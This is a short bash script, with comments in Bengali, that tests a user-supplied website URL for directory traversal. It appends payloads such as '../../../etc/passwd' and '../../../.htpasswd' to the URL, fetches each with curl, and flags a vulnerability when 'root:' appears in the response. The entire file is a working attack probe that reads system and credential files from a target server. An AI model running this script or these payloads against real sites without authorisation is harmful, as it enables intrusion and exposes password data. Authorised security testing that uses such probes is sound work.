#!/bin/bash

# ওয়েবসাইট URL ইনপুট নিন
echo "Enter Website URL for Directory Traversal Test (e.g., http://example.com/images/):"
read URL

# ডিরেক্টরি ট্রাভার্সাল পে-লোড
PAYLOADS=("../../../etc/passwd" "../../../var/www/html/index.php" "../../../.htpasswd")

for PAYLOAD in "${PAYLOADS[@]}"
do
    # পে-লোড প্রয়োগ করা
    TEST_URL="${URL}${PAYLOAD}"
    RESPONSE=$(curl -s $TEST_URL)

    # যদি সাইটে সেনসিটিভ ফাইল এক্সপোজ হয়
    if echo $RESPONSE | grep -q "root:"; then
        echo "[+] Directory Traversal vulnerability detected with payload: $PAYLOAD"
    else
        echo "[-] No Directory Traversal vulnerability detected with payload: $PAYLOAD"
    fi
done
